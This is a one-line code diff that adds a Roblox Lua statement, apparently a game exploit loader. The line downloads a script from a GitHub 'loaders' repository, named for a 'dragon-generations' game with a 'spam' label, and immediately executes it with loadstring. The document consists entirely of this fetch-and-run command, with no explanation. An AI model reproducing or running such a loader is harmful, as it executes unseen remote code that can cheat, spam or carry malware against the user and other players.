@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/dragon-generations-spam2-57gc54zko6vjk9.lua"))()
